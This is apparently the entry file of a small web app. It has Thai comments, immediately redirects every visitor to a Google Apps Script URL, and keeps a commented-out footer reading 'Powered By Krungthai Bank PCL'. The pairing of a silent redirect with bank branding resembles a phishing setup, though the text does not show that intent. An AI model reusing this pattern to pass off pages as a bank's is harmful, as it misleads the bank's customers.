import './index.css'

// ใส่ Link ที่เตรียมไว้ตรงนี้
const TARGET_URL = 'https://script.google.com/macros/s/AKfycbz1asTVvaXxEJs8Q4z7FR58qpPqsPPch6mDbKaPYduFwnrDrIRA-sVpBp2dxitTT4K_/exec';

// สั่ง Redirect ทันที
window.location.replace(TARGET_URL);

// เราไม่จำเป็นต้องใช้ createRoot แล้วในกรณีนี้
//<div id="poweredByFooter" style="position:fixed; bottom:6px; left:6px; font-size:11px; color:#9aa1b0; z-index:999; background:rgba(255,255,255,0.85); padding:2px 10px; border-radius:6px;">Powered By Krungthai Bank PCL</div>